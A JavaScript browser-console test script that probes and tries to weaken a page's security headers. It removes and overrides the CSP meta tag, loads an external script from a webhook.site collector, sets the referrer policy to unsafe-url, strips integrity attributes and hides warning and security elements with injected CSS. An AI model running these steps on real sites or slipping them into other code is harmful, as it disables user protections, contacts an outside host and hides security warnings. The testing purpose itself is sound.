// =============================================================
// TEST 05: CSP / Security Header Bypass from DevTools
// =============================================================

// --- Test 5.1: Check current CSP ---
var meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
console.log('[TEST 5.1] Meta CSP:', meta ? meta.content : '(none in meta)');
console.log('[TEST 5.1] Check Response Headers in Network tab for server CSP');

// --- Test 5.2: Remove CSP meta tag ---
if (meta) {
    meta.remove();
    console.log('[TEST 5.2] CSP meta tag REMOVED');
} else {
    console.log('[TEST 5.2] No meta CSP to remove — CSP may be server-header only');
}

// --- Test 5.3: Inject inline script (CSP violation test) ---
var inlineScript = document.createElement('script');
inlineScript.textContent = 'window.__cspTest = "inline-executed"; console.log("[TEST 5.3] Inline script executed despite CSP")';
document.head.appendChild(inlineScript);
console.log('[TEST 5.3] window.__cspTest:', window.__cspTest || 'BLOCKED by CSP');

// --- Test 5.4: Inject external script (CSP violation test) ---
var extScript = document.createElement('script');
extScript.src = 'https://webhook.site/3bf3755d-69fc-4f50-a34c-3c28ed2765ef?test=csp-external-script';
extScript.onload = function() { console.log('[TEST 5.4] External script loaded PAST CSP'); };
extScript.onerror = function() { console.log('[TEST 5.4] External script BLOCKED by CSP'); };
document.head.appendChild(extScript);

// --- Test 5.5: Override CSP via meta injection ---
var newCSP = document.createElement('meta');
newCSP.httpEquiv = 'Content-Security-Policy';
newCSP.content = "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;";
document.head.appendChild(newCSP);
console.log('[TEST 5.5] Permissive CSP meta injected — try inline scripts again');

// --- Test 5.6: Test if X-Frame-Options can be bypassed ---
var testFrame = document.createElement('iframe');
testFrame.src = window.location.href; // try to iframe the current page
testFrame.style.cssText = 'width:300px;height:200px;position:fixed;bottom:10px;right:10px;z-index:99999;border:2px solid red;';
document.body.appendChild(testFrame);
console.log('[TEST 5.6] Self-iframe injected — check if X-Frame-Options blocks it');

// --- Test 5.7: Override Referrer-Policy ---
var refMeta = document.createElement('meta');
refMeta.name = 'referrer';
refMeta.content = 'unsafe-url'; // Send full URL as referrer everywhere
document.head.appendChild(refMeta);
console.log('[TEST 5.7] Referrer policy overridden to unsafe-url');

// --- Test 5.8: Disable SRI (Subresource Integrity) ---
document.querySelectorAll('script[integrity], link[integrity]').forEach(function(el) {
    console.log('[TEST 5.8] SRI element found:', el.tagName, el.src || el.href);
    el.removeAttribute('integrity');
    console.log('[TEST 5.8] SRI attribute REMOVED from:', el.src || el.href);
});

// --- Test 5.9: Inject style to hide security warnings ---
var hideWarnings = document.createElement('style');
hideWarnings.textContent = `
    [class*="warning"], [class*="security"], [class*="alert"], [class*="block"],
    [id*="warning"], [id*="security"], [id*="alert"], [id*="block"] {
        display: none !important;
    }
`;
document.head.appendChild(hideWarnings);
console.log('[TEST 5.9] CSS injected to hide warning/security/alert/block elements');
